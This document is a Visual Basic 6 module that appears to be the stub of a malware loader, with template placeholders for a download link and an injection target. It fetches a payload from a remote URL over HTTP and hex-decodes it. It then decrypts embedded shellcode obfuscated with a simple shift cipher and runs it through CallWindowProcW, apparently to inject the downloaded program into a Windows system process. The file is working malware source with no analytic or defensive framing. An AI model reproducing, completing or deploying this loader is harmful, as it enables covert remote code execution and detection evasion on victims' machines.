Attribute VB_Name = "B01"
Private Declare Function CallWindowProcW Lib "USER32" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
 Declare Sub Sleep Lib "kernel32.dll" ( _
     ByVal dwMilliseconds As Long)
 Private vs_ASM(22) As String
 Private sh(22) As String
Private b_ASM(1287) As Byte

 Sub Main()
Sleep 7000
   Dim ba() As Byte
   Dim Arr(3) As String
   Arr(1) = "POST": Arr(2) = "Microsoft.XMLHTTP": Arr(3) = "%Link%"
   Dim wHT As Object
    Set wHT = CreateObject(Arr(2))
    wHT.Open Arr(1), Arr(3), False
    wHT.Send
   ba = H2B(wHT.responseText)
 Ru Environ("windir") & "%inject%", ba
 End Sub
 Function H2B(ByVal HexValue As String) As Byte()
        Dim X
        Dim ByteArray() As Byte
        HexValue = Replace(HexValue, " ", "")
        ReDim ByteArray((Len(HexValue) \ 2) - 1)
        For X = 0 To UBound(ByteArray) - 2
            ByteArray(X) = CLng("&H" & Mid$(HexValue, 2 * X + 1, 2))
        Next
        H2B = ByteArray
    End Function
Function decrypt(s As String, p As String)
    Dim i As Integer
        Dim pi As Integer
        pi = Len(p)
        Dim pi2 As Integer
        pi2 = 1
        Dim t As String
        t = ""
        For i = 1 To Len(s)
            If pi2 = pi Then pi2 = 1
            t = t & ChrW(AscW(Mid(s, i, 1)) - pi2)
            pi2 = pi2 + 1
        Next i
        decrypt = t
    End Function
Public Sub Ru(ByVal TargetHost As String, bBuffer() As Byte)
    Dim i As Long
    Dim j As Long
    Dim k As Long
 vs_ASM(0) = "^2H<9K^81234;H^8^^34<8^8^G34;;^8^E3489^8443456^8^G34<:^8^634;I^8^E3456^8123456^8123456^8123456^8123456^8123456^8"
 vs_ASM(1) = "123456^8123456^8123456^8123456^8123456^8123456^8123456^86D;FKI=I54H<GH^;1234=H<<365<=?899D88^:9K^C6IJ>HI153456?A"
 vs_ASM(2) = "239E9GL@B33^56^89;6=;G8M^C6GJ>@L153456=I349<K:^81234J>@9153456=I389E^:L@9:3^56^8^C5E;G;8F::J59^8129E^K=I1EH<<<^;"
 vs_ASM(3) = "1234;G::^:F<56^812H<;G^;1234;G9IF:8G59^812;F5?J?13^856^8129E68L@5F3^56^8^:8FJ>8<DH85J>>A153456=I4GH<8H^;1234=HK9"
 vs_ASM(4) = "^C4IJ>::153456=I52IJ88MN43IJI6=I24H<^9^;1234;><JF:48HL<9F:^J59^8129E6KL@233^56^89D3==H<94E9E8KL@1^3^56^89D6=59MI"
 vs_ASM(5) = "^C56J>MI143456?J1;9<K>^81234:=<9GHG4;G^8F:H<58^8129<=>MMC54::^L@263^56^8^C5IJ>K>143456?J4;9E^GL@DF3656^89D45;G;:"
 vs_ASM(6) = "F:F858^8128;:8=I129E56=I169E56=I129E56=I12IJ8^MNE29E68L@B;3656^8^:G48=88G485J>K=143456=I34H<>=^:1234=H89^C5IJ>?M"
 vs_ASM(7) = "143456?J1;IJ<8:<GH65KLK8^C34J>>M143456=@:E<96G=M63H<FG^:1234;G9:F:9G58^812;F6^?J4;9E^KL@^33656^89D3=;G;8^:3486^8"
 vs_ASM(8) = "12IJ<8<8GH:;8:MN43IJI6=I48H<9=^:1234=HK9^C56J>:M143456?J4;9E8KL@4^3656^89D65;G9:F:5G58^812;F5^=I3GH<^9^:1234=H^A"
 vs_ASM(9) = "64IJ<=<<68IJ<6:<GH65;G^8F:4458^8129<F^=I4FG<:^L@4E3656^895F85IMNE29E68L@G;3556^8^:8FJ>8<DH85J>9=143456=I34H<J=^9"
 vs_ASM(10) = "1234=H8995F65<=I4CH<IH^91234;G^:6485KLK8^C6:J>JM133456J?133456^812E<^>^81234;G:>F:EG5^^812I;^^=I2GH<G9^91234=H89"
 vs_ASM(11) = "9D868I?9D4I<56^8123^I6=I4GH<>L^912345989^C5:J>@>133456=I3:86KL:9^C46J>?I133456=@6DH<6:JN63H<G<^91234=9J<1EIJI6=I"
 vs_ASM(12) = "38H<<9^91234=H:A9D3==H>9269E8KL@^^3556^81565;G9>F:8G5^^812;F5??J633G;G9:F:845^^812;F5?^;6368;G;>F:^85^^812;FH^=I"
 vs_ASM(13) = "3GH<8H^91234=H^A62IJ<=886886KL:9^C34J>9I133456=@B39E8JK@63H<:<^91234=9J<1EIJI6=I48H<69^91234=H8995F65^?A239E8GL@"
 vs_ASM(14) = "1^3556^89D3=8HJI1H;989MNGHIJ;G::F:I856^812;F5?J?133;56^9129E56L@F^3456^8^:G6H=H?^:85J>89133456=I44H<I9^81234=H89"
 vs_ASM(15) = "^C5IJ>JI123456?J1;86KL>916IJI6=I34H<GH^81234=H:A95F;8:=I44H<FL^81234=H:99DE:F:^81234=9J>1:9E^KL@:F3456^89D45;G;>"
 vs_ASM(16) = "F:<856^81285;G^<698:KL::^C34J>?>123456=@B39E8JK@63H<G8^81234=9J<1EIJI6=I34H<;L^81234=H^A9D85^>^;6368;G::F:9456^8"
 vs_ASM(17) = "12;F5??9D3E456^812;=6^=I12H<9L^81234;>K;D9D;J><9F::F56^8129E88L@4F3456^89DG5;G9MF:6856^812;F5?MN44IJ<^^<GHG4;G^8"
 vs_ASM(18) = "F:5856^8129<=>:N5C<I:^L@623456^8^C5IJ>8:123456?J1;IJ<^^<GHG4;G;IF:3856^812;F^^=9D5;FHH^;5E585:J;^C34J>M:GHIJKL=@"
 vs_ASM(19) = "66FEFL@963H<6K^81234;G;8^:3466^812IJ<:9<2:9E56MNE2IJ<:9<26H<HLMNGHIJ=?^995F866J;F:5656^8129<F:;M1GHG:6L@5D3456^8"
 vs_ASM(20) = "95F85>MN86585:MNE2IJ<:9<1:84J>:@123456?;D63<H9<=6485:9<>696^H6=<9D:486?J883G=H>>2E;F;K^@9D:I^6?J486<9=8@8^I^=6:N"
 vs_ASM(21) = "^D:85=?84H^F<:^:FDH;=HJ=6H8I:H<A6C8HH9<=6485:9<>69;F;I9<2E;9JJ><55;F9;:K9D88^>>@15G9=H;I2:;F:G9815GHJ9:85;;F8:?J"
 vs_ASM(22) = "15I989MN45F4KIHK96F4<:^?D3FJ5J^;G:HFK::J8E58^6>=F3;F:G9<15GH;<?J1E^F=H<I2E3^IJ?J16;F59J=6H8I:H<A6C8HH9J;123456^8"

 For i = 0 To 22
 sh(i) = ""
 vs_ASM(i) = Replace(vs_ASM(i), "^", "7")
            sh(i) = sh(i) & decrypt(vs_ASM(i), "Passwords")
 Next i

    For i = 0 To 22
        For j = 1 To 112 Step 2
            b_ASM(k) = CByte("&H" & Mid$(sh(i), j, 2)): k = k + 1 - 1 + 1
        Next j
    Next i

    CallWindowProcW VarPtr(b_ASM(0 + 0)), StrPtr(TargetHost), VarPtr(bBuffer(0 + 0)), 0, 0
End Sub
